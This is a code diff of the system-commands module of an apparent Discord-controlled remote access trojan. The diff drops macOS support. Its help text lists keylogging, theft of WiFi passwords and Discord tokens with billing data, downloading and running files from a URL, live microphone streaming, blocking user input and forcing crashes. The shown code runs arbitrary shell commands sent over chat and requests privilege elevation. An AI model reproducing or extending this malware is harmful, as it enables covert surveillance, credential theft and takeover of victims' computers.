@@ -1,12 +1,11 @@
 """
-commands/system.py - general system control commands with macOS support.
+commands/system.py - general system control commands.
 """
 
 import os
 import platform
 import subprocess
 import tempfile
-import sys
 
 import discord
 import psutil
@@ -44,29 +43,31 @@ class SystemCommands(commands.Cog):
     **Available Commands:**
     `!ping` - Shows the bot's latency.
     `!screenshot` - Takes a screenshot and sends it.
-    `!cmd <command>` - Executes a Shell/CMD command.
-    `!powershell <command>` - Executes a PowerShell command (Windows Only).
+    `!cmd <command>` - Executes a CMD command.
+    `!powershell <command>` - Executes a PowerShell command.
     `!file_upload <target_path>` - Uploads a file.
     `!file_download <file_path>` - Sends a file or folder to Discord.
     `!execute <url>` - Downloads and executes a file from the URL.
     `!notify <title> <message>` - Sends a notification.
     `!restart` - Restarts the PC.
     `!shutdown` - Shuts down the PC.
-    `!admin` - Requests admin/root rights.
+    `!admin` - Requests admin rights.
     `!stop` - Stops the bot.
     `!wifi` - Shows WiFi profiles and passwords.
     `!system_info` - Shows system information.
     `!tasklist` - Lists every running process with Name and PID.
     `!taskkill <pid>` - Kills a process with the given PID.
     `!tts <message>` - Plays a custom text-to-speech message.
-    `!mic_stream_start` - Starts a live stream of the microphone.
-    `!mic_stream_stop` - Stops the mic stream.
+    `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
+    `!mic_stream_stop` - Stops the mic stream if activated.
     `!keylog <on/off>` - Activates or deactivates keylogging.
-    `!bsod` - Triggers a Blue Screen (Windows) or Kernel Panic (Mac).
+    `!bsod` - Triggers a Blue Screen of Death.
     `!input <block/unblock>` - Blocks or unblocks user input.
     `!blackscreen <on/off>` - Makes the screen completely black.
-    `!volume` - Shows volume information.
-    `!grab_discord` - Grabs Discord Tokens and info.
+    `!volume` - Shows volume information and available commands.
+    `!volume <mute/unmute>` - Mutes or unmutes the device.
+    `!volume <number from 1-100>` - Sets the volume to a specific percentage.
+    `!grab_discord` - Grabs Discord Tokens, Billing and Contact Information.
     `!purge` - Deletes bot messages and commands.
         """
         embed = discord.Embed(title="Help", description=help_text, color=0x0084FF)
@@ -113,7 +114,6 @@ class SystemCommands(commands.Cog):
             return
         working = await ctx.send("🔄 Working...")
         try:
-            # shell=True uses /bin/sh on macOS, which is what we want
             result = subprocess.run(
                 command,
                 shell=True,
@@ -128,13 +128,9 @@ class SystemCommands(commands.Cog):
                 combined += f"Standard Output:\n{result.stdout}\n"
             if result.stderr:
                 combined += f"Standard Error:\n{result.stderr}\n"
-            
-            if not combined:
-                combined = "Command executed with no output."
-
             for chunk in chunk_string(combined):
                 await ctx.send(f"```{chunk}```")
-            await log_message(ctx, f"Command executed: {command}")
+            await log_message(ctx, f"CMD command executed: {command}")
         except Exception as e:
             await log_message(ctx, f"Error executing command: {e}")
         finally:
@@ -149,11 +145,6 @@ class SystemCommands(commands.Cog):
         if not in_correct_channel(ctx):
             await wrong_channel(ctx)
             return
-        
-        if not IS_WINDOWS:
-            await log_message(ctx, "❌ PowerShell is only supported on Windows. Use `!cmd` for macOS.")
-            return
-
         working = await ctx.send("🔄 Working...")
         try:
             result = subprocess.run(
@@ -188,16 +179,9 @@ class SystemCommands(commands.Cog):
             return
         try:
             u = platform.uname()
-            if platform.system() == "Darwin":
-                # Get specific macOS version
-                mac_ver = platform.mac_ver()[0]
-                system_str = f"macOS {mac_ver}"
-            else:
-                system_str = u.system
-
             info = (
                 f"**System Information:**\n"
-                f"System: {system_str}\nNode Name: {u.node}\nRelease: {u.release}\n"
+                f"System: {u.system}\nNode Name: {u.node}\nRelease: {u.release}\n"
                 f"Version: {u.version}\nMachine: {u.machine}\nProcessor: {u.processor}"
             )
             await ctx.send(info)
@@ -259,12 +243,7 @@ class SystemCommands(commands.Cog):
             await wrong_channel(ctx)
             return
         try:
-            if platform.system() == "Darwin":
-                # Native macOS notification via AppleScript
-                apple_script = f'display notification "{message}" with title "{title}"'
-                subprocess.run(["osascript", "-e", apple_script])
-            else:
-                notification.notify(title=title, message=message, timeout=10)
+            notification.notify(title=title, message=message, timeout=10)
             await log_message(ctx, f"Notification sent: {title} - {message}")
         except Exception as e:
             await log_message(ctx, f"Error sending notification: {e}")
@@ -276,14 +255,11 @@ class SystemCommands(commands.Cog):
             await wrong_channel(ctx)
             return
         try:
-            await log_message(ctx, "The PC is restarting.")
             if IS_WINDOWS:
                 subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
-            elif platform.system() == "Darwin":
-                # Uses AppleScript to trigger restart without needing sudo
-                subprocess.run(["osascript", "-e", 'tell app "System Events" to restart'])
             else:
                 subprocess.run(["reboot"], check=True)
+            await log_message(ctx, "The PC is restarting.")
         except Exception as e:
             await log_message(ctx, f"Error restarting the PC: {e}")
 
@@ -294,14 +270,11 @@ class SystemCommands(commands.Cog):
             await wrong_channel(ctx)
             return
         try:
-            await log_message(ctx, "The PC is shutting down.")
             if IS_WINDOWS:
                 subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
-            elif platform.system() == "Darwin":
-                # Uses AppleScript to trigger shutdown without needing sudo
-                subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
             else:
                 subprocess.run(["shutdown", "-h", "now"], check=True)
+            await log_message(ctx, "The PC is shutting down.")
         except Exception as e:
             await log_message(ctx, f"Error shutting down the PC: {e}")
 
@@ -313,14 +286,16 @@ class SystemCommands(commands.Cog):
             return
         if check_if_admin():
             utils.is_admin = True
-            await log_message(ctx, "Admin/Root rights already present.")
+            await log_message(ctx, "Admin rights already present.")
             return
         try:
             if elevate():
                 await log_message(
-                    ctx, "Elevation requested. The old process will now be terminated."
+                    ctx, "Admin rights granted. The old process will now be terminated."
                 )
                 import asyncio
+                import os
+
                 await asyncio.sleep(2)
                 os._exit(0)
         except Exception as e:
